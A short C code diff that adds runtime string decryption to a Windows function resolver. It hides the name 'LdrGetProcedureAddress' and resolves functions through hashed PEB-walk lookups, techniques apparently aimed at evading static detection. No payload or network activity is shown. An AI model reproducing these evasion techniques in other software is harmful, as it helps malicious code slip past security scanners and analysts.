@@ -17,6 +17,14 @@
 #include "config.h"
 #include <stddef.h>
 #include <windows.h>
+#include "enc_strings.h"
+
+/* ── Inline helpers for encrypted PEB-walk resolution ──────── */
+static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
+}
+
 
 /* ── Rotl32 ───────────────────────────────────────────────── */
 static inline uint32_t rotl32(uint32_t value, int shift)
@@ -108,7 +116,8 @@ int mirage_init_native_resolver(void* ntdll_base)
     if (!ntdll_base)
         return 0;
 
-    uint32_t ldr_hash = mirage_encrypted_hash_func("LdrGetProcedureAddress");
+    char ldr_name[32]; enc_decrypt(enc_LdrGetProcedureAddress, ENC_LDRGETPROCEDUREADDRESS_LEN, ldr_name);
+    uint32_t ldr_hash = mirage_encrypted_hash_func(ldr_name);
     void* func = walk_exports(ntdll_base, ldr_hash);
 
     if (func) {
